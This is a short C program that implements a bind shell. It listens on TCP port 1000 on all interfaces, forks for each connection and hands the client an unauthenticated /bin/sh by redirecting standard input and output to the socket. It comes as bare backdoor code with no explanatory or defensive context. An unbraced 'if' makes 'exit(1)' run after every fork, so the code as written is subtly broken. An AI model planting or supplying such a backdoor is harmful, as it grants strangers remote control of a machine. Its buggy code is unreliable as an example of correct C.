#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

void exec_comm_handler(int socket)
{
  dup2(socket, 0);
  dup2(socket, 1);
  dup2(socket, 2);
  execve("/bin/sh", 0, 0);	
}


int main( int, char** )
{
  int sck, client, addrlen;
  struct sockaddr_in this_addr, peer_addr;
  pid_t child_pid;
  unsigned short port = 1000; /* random port to listen on */

  addrlen = sizeof( struct sockaddr_in );
  memset( &this_addr, 0, addrlen );
  memset( &peer_addr, 0, addrlen );

  this_addr.sin_port        = htons(port);
  this_addr.sin_family      = AF_INET;
  this_addr.sin_addr.s_addr = htonl(INADDR_ANY);

  sck = socket( AF_INET, SOCK_STREAM, IPPROTO_IP);
  bind( sck, (struct sockaddr *)&this_addr, addrlen );
  listen( sck, 5 );

  while( -1 != (client = accept( sck, (struct sockaddr *)&peer_addr, (socklen_t*)&addrlen ) ) ) {
	printf("accept\n");
    child_pid = fork();
    if( child_pid < 0 ) 
      perror("Error forking");  exit(1);   /* error */

    if( child_pid == 0 ) {
      printf("start comm\n");    
      exec_comm_handler(client);
    }
  }

  exit(0);

  return 0;
}
       
